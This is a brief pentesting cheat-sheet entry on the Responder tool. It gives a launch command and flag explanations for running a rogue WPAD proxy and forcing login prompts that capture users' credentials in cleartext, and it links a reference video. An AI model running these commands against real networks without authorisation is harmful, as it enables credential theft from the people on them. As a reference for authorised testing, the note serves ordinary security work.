Responder

```
responder -i <AttackingIP> -w

-i specific ip address
-I specific network interface
-w Starts WPAD proxy server. For computers looking for WPAD responder will send its information
-F (this forces a login prompt for users to grab creds in cleartext) 
-b HTTP authentication ( prompts when users use IE)
-r needed to rectify -b errors

Note don't use -b and/or -r in a production environment
```



References:

https://www.youtube.com/watch?v=sAr4PBR7EUE



